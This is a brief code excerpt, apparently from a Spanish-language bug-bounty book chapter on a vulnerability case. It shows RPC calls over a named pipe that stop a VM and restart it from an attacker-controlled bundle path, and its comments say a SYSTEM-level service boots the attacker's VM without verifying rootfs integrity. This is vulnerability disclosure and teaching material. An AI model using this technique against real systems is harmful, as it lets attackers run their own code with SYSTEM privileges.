// Extraído de: LibroBugBounty/cap-23-caso-anthropic.md
send_rpc(pipe, "stopVM", "{}");
send_rpc(pipe, "startVM",
    "{\"bundlePath\":\"C:\\\\Users\\\\hunter\\\\evil_vm\"}");
// El servicio SYSTEM arranca la VM del atacante
// sin verificar la integridad del rootfs
